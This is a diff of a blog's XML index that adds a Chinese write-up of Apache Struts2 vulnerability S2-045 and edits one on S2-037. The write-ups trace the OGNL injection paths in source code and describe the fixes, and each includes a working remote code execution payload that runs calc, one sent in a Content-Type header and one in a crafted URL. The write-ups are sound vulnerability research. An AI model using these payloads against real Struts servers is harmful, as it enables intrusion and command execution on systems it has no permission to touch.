@@ -4,11 +4,30 @@
   
   
   <entry>
+    <title>struts2系列漏洞 S2-045</title>
+    <link href="/2020/07/31/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-045/"/>
+    <url>/2020/07/31/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-045/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.29 版本 struts2 + Tomcat 9。</p><p>在 struts.xml 中加上用于存放临时文件的 saveDir，当然不加也没什么关系：</p><pre><code class="xml">&lt;constant name=&quot;struts.multipart.saveDir&quot; value=&quot;upload/&quot; /&gt;</code></pre><p>修改前端表单：</p><pre><code class="html">&lt;s:form action=&quot;login&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;s:file name=&quot;upload&quot; label=&quot;选择上传的文件&quot; /&gt;    &lt;s:submit value=&quot;提交&quot;/&gt;&lt;/s:form&gt;</code></pre><p>然后修改 Action，加上文件上传相关的属性以及他们的 getter、setter，后面两个属性应该也用不上：</p><pre><code class="java">private File upload;private String uploadContentType;private String uploadFileName;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">官方通告</a>，问题发生在 Jakarta 解析 HTTP 头中的 Content-Type 时，如果 Content-Type 非法，struts2 会将错误抛出，而这里存在一个 OGNL 表达式注入。</p><p>开始调试，给 JakartaMultiPartRequest 类的 parse 函数下断点，结果发现修改 Content-Type 无法触发断点，往前跟踪到 Dispatcher 类的 wrapRequest 函数可以发现：</p><pre><code class="java">public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {    // don&#39;t wrap more than once    if (request instanceof StrutsRequestWrapper) {        return request;    }    String content_type = request.getContentType();    if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) {        MultiPartRequest mpr = getMultiPartRequest();        LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);        request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);    } else {        request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);    }    return request;}</code></pre><p>content_type 中要包含 multipart/form-data 这个字符串，struts2 才会调用 Jakarta 进行下一步解析，我们回到 parse 函数：</p><pre><code class="java">public void parse(HttpServletRequest request, String saveDir) throws IOException {    try {        setLocale(request);        processUpload(request, saveDir);    } catch (FileUploadBase.SizeLimitExceededException e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Request exceeded size limit!&quot;, e);        }        String errorMessage = buildErrorMessage(e, new Object[]{e.getPermittedSize(), e.getActualSize()});        if (!errors.contains(errorMessage)) {            errors.add(errorMessage);        }    } catch (Exception e) {        if (LOG.isWarnEnabled()) {            LOG.warn(&quot;Unable to parse request&quot;, e);        }        String errorMessage = buildErrorMessage(e, new Object[]{});        if (!errors.contains(errorMessage)) {            errors.add(errorMessage);        }    }}</code></pre><p>观察捕获异常后调用的 buildErrorMessage 函数：</p><pre><code class="java">protected String buildErrorMessage(Throwable e, Object[] args) {    String errorKey = &quot;struts.messages.upload.error.&quot; + e.getClass().getSimpleName();    if (LOG.isDebugEnabled()) {        LOG.debug(&quot;Preparing error message for key: [#0]&quot;, errorKey);    }    return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, e.getMessage(), args);}</code></pre><p>会将错误信息做参调用 findText 函数，继续跟踪可以来到 getDefaultMessage 函数：</p><pre><code class="java">private static GetDefaultMessageReturnArg getDefaultMessage(String key, Locale locale, ValueStack valueStack, Object[] args, String defaultMessage) {    GetDefaultMessageReturnArg result = null;    boolean found = true;    if (key != null) {        String message = findDefaultText(key, locale);        if (message == null) {            message = defaultMessage;            found = false; // not found in bundles        }        // defaultMessage may be null        if (message != null) {            MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);            String msg = formatWithNullDetection(mf, args);            result = new GetDefaultMessageReturnArg(msg, found);        }    }    return result;}</code></pre><p>调用 translateVariables 将错误信息当成了一个 OGNL 表达式来解析，所以如果我们能控制报错信息，我们就能进行 OGNL 表达式注入。</p><p>接下来观察 processUpload 函数的解析过程，来到跟 Content-Type 有关的 FileUploadBase 类的 FileItemIteratorImpl 函数，可以看到这里会抛出 InvalidContentTypeException：</p><pre><code class="java">String contentType = ctx.getContentType();if ((null == contentType)    || (!contentType.toLowerCase(Locale.ENGLISH).startsWith(MULTIPART))) {    throw new InvalidContentTypeException(        format(&quot;the request doesn&#39;t contain a %s or %s stream, content type header is %s&quot;,            MULTIPART_FORM_DATA, MULTIPART_MIXED, contentType));}</code></pre><p>如果 Content-Type 不以  multipart/ 开头，就会抛出这个异常，而且将 Content-Type 拼接进了错误信息里面，这样利用链就完成了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>跟之前 S2-037 的 payload 一致，如果是更高版本的 struts2，则要复杂一些，具体的后面再分析，这里贴一个 payload：</p><pre><code>Content-Type: Twings multipart/form-data %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))}</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.32 版本的修复，修改了 buildErrorMessage 函数：</p><pre><code class="java">if (LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, null, new Object[0]) == null) {    return LocalizedTextUtil.findText(this.getClass(), &quot;struts.messages.error.uploading&quot;, defaultLocale, null, new Object[] { e.getMessage() });} else {    return LocalizedTextUtil.findText(this.getClass(), errorKey, defaultLocale, null, args);}</code></pre><p>不再将错误信息作为 defaultMessage 传入 findText 函数。</p><hr><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/4605" target="_blank" rel="noopener">https://xz.aliyun.com/t/4605</a></p><p><a href="https://xz.aliyun.com/t/3395" target="_blank" rel="noopener">https://xz.aliyun.com/t/3395</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>struts2系列漏洞 S2-037</title>
     <link href="/2020/07/29/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-037/"/>
     <url>/2020/07/29/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E-S2-037/</url>
     
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><p>跟 S2-032 同原理，是 S2-033 的进化版本，不需要开启 DynamicMethodInvocation。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28.1 版本的 struts2 + Tomcat 9。</p><p>用 maven 安装依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;    &lt;artifactId&gt;struts2-rest-plugin&lt;/artifactId&gt;    &lt;version&gt;2.3.28.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>类似 S2-032 如果能想 mapping 中 set 一个未经过滤的字符串作为表达式，我们就可以实现命令执行。</p><p>阅读 RestActionMapper 类的 getMapping 函数，可以看到这里有很多 setMethod，比如：</p><pre><code class="java">String fullName = mapping.getName();// Only try something if the action name is specifiedif (fullName != null &amp;&amp; fullName.length() &gt; 0) {    // cut off any ;jsessionid= type appendix but allow the rails-like ;edit    int scPos = fullName.indexOf(&#39;;&#39;);    if (scPos &gt; -1 &amp;&amp; !&quot;edit&quot;.equals(fullName.substring(scPos + 1))) {        fullName = fullName.substring(0, scPos);    }    int lastSlashPos = fullName.lastIndexOf(&#39;/&#39;);    String id = null;    if (lastSlashPos &gt; -1) {        // fun trickery to parse &#39;actionName/id/methodName&#39; in the case of &#39;animals/dog/edit&#39;        int prevSlashPos = fullName.lastIndexOf(&#39;/&#39;, lastSlashPos - 1);        //WW-4589 do not overwrite explicit method name        if (prevSlashPos &gt; -1 &amp;&amp; mapping.getMethod() == null) {            mapping.setMethod(fullName.substring(lastSlashPos + 1));            fullName = fullName.substring(0, lastSlashPos);            lastSlashPos = prevSlashPos;        }        id = fullName.substring(lastSlashPos + 1);    }    ...}</code></pre><p>这些函数调用都没有对输入参数进行过滤。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在进入 getMapping 函数的 setMethod 之前，还有一个 dropExtension 的函数调用，用于处理 URI 后缀并返回：</p><pre><code class="java">protected String dropExtension(String name, ActionMapping mapping) {    if (extensions == null) {        return name;    }    for (String ext : extensions) {        if (&quot;&quot;.equals(ext)) {            // This should also handle cases such as /foo/bar-1.0/description. It is tricky to            // distinquish /foo/bar-1.0 but perhaps adding a numeric check in the future could            // work            int index = name.lastIndexOf(&#39;.&#39;);            if (index == -1 || name.indexOf(&#39;/&#39;, index) &gt;= 0) {                return name;            }        } else {            String extension = &quot;.&quot; + ext;            if (name.endsWith(extension)) {                name = name.substring(0, name.length() - extension.length());                mapping.setExtension(ext);                return name;            }        }    }    return null;}</code></pre><p>所以 S2-032 的 payload 需要稍加修改，而且 2.3.28.1 版本的 OGNL 禁止了逗号和括号执行多条表达式，所以要换个办法，payload：</p><pre><code>http://localhost:8080/login/method/((%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)-(@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d))).toString.xhtml?c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.29 的修复，DefaultActionInvocation 类的 invokeAction 方法里解析表达式的函数改变了，从 getValue：</p><pre><code class="java">methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>变成了 callMethod：</p><pre><code class="java">methodResult = ognlUtil.callMethod(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>而 callMethod 中调用的是 compileAndExecuteMethod，会有 isSimpleMethod 函数的校验：</p><pre><code class="java">private boolean isSimpleMethod(Object tree, Map&lt;String, Object&gt; context) throws OgnlException {    if (tree instanceof SimpleNode) {        SimpleNode node = (SimpleNode) tree;        OgnlContext ognlContext = null;        if (context!=null &amp;&amp; context instanceof OgnlContext) {            ognlContext = (OgnlContext) context;        }        return node.isSimpleMethod(ognlContext) &amp;&amp; !node.isChain(ognlContext);    }    return false;}</code></pre><p>用于检查调用的方法是否是单独的方法调用。</p><hr><p>参考文章：</p><p><a href="http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/</a></p>]]></content>
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p><p>跟 S2-032 同原理，是 S2-033 的进化版本，不需要开启 DynamicMethodInvocation。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.28.1 版本的 struts2 + Tomcat 9。</p><p>用 maven 安装依赖：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;    &lt;artifactId&gt;struts2-rest-plugin&lt;/artifactId&gt;    &lt;version&gt;2.3.28.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>类似 S2-032 如果能想 mapping 中 set 一个未经过滤的字符串作为表达式，我们就可以实现命令执行。</p><p>阅读 RestActionMapper 类的 getMapping 函数，可以看到这里有很多 setMethod，比如：</p><pre><code class="java">String fullName = mapping.getName();// Only try something if the action name is specifiedif (fullName != null &amp;&amp; fullName.length() &gt; 0) {    // cut off any ;jsessionid= type appendix but allow the rails-like ;edit    int scPos = fullName.indexOf(&#39;;&#39;);    if (scPos &gt; -1 &amp;&amp; !&quot;edit&quot;.equals(fullName.substring(scPos + 1))) {        fullName = fullName.substring(0, scPos);    }    int lastSlashPos = fullName.lastIndexOf(&#39;/&#39;);    String id = null;    if (lastSlashPos &gt; -1) {        // fun trickery to parse &#39;actionName/id/methodName&#39; in the case of &#39;animals/dog/edit&#39;        int prevSlashPos = fullName.lastIndexOf(&#39;/&#39;, lastSlashPos - 1);        //WW-4589 do not overwrite explicit method name        if (prevSlashPos &gt; -1 &amp;&amp; mapping.getMethod() == null) {            mapping.setMethod(fullName.substring(lastSlashPos + 1));            fullName = fullName.substring(0, lastSlashPos);            lastSlashPos = prevSlashPos;        }        id = fullName.substring(lastSlashPos + 1);    }    ...}</code></pre><p>这些函数调用都没有对输入参数进行过滤。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在进入 getMapping 函数的 setMethod 之前，还有一个 dropExtension 的函数调用，用于处理 URI 后缀并返回：</p><pre><code class="java">protected String dropExtension(String name, ActionMapping mapping) {    if (extensions == null) {        return name;    }    for (String ext : extensions) {        if (&quot;&quot;.equals(ext)) {            // This should also handle cases such as /foo/bar-1.0/description. It is tricky to            // distinquish /foo/bar-1.0 but perhaps adding a numeric check in the future could            // work            int index = name.lastIndexOf(&#39;.&#39;);            if (index == -1 || name.indexOf(&#39;/&#39;, index) &gt;= 0) {                return name;            }        } else {            String extension = &quot;.&quot; + ext;            if (name.endsWith(extension)) {                name = name.substring(0, name.length() - extension.length());                mapping.setExtension(ext);                return name;            }        }    }    return null;}</code></pre><p>所以 S2-032 的 payload 需要稍加修改，而且 2.3.28.1 版本的 OGNL 禁止了逗号和括号执行多条表达式，所以要换个办法，payload：</p><pre><code>http://localhost:8080/login/method/((%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)-(@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d))).toString.xhtml?c=calc</code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.29 的修复，DefaultActionInvocation 类的 invokeAction 方法里解析表达式的函数改变了，从 getValue：</p><pre><code class="java">methodResult = ognlUtil.getValue(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>变成了 callMethod：</p><pre><code class="java">methodResult = ognlUtil.callMethod(methodName + &quot;()&quot;, getStack().getContext(), action);</code></pre><p>而 callMethod 中调用的是 compileAndExecuteMethod，会有 isSimpleMethod 函数的校验：</p><pre><code class="java">private boolean isSimpleMethod(Object tree, Map&lt;String, Object&gt; context) throws OgnlException {    if (tree instanceof SimpleNode) {        SimpleNode node = (SimpleNode) tree;        OgnlContext ognlContext = null;        if (context!=null &amp;&amp; context instanceof OgnlContext) {            ognlContext = (OgnlContext) context;        }        return node.isSimpleMethod(ognlContext) &amp;&amp; !node.isChain(ognlContext);    }    return false;}</code></pre><p>用于检查调用的方法是否是单独的方法调用，@ 和 . 这种链式调用就被禁止了。</p><hr><p>参考文章：</p><p><a href="http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/struts2-s2-037-vulnerability-analysis/</a></p>]]></content>
     
     
     
@@ -706,9 +725,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -784,9 +803,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -807,9 +826,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -828,9 +847,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -849,9 +868,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -912,9 +931,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>Web</tag>
       
       <tag>Pwn</tag>
       
@@ -935,9 +954,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -956,9 +975,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -977,9 +996,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -998,9 +1017,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1080,9 +1099,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1141,9 +1160,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>复现</tag>
       
@@ -1164,9 +1183,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1185,9 +1204,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1225,9 +1244,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1246,9 +1265,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1286,9 +1305,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Crypto</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -1307,9 +1326,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -1511,9 +1530,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
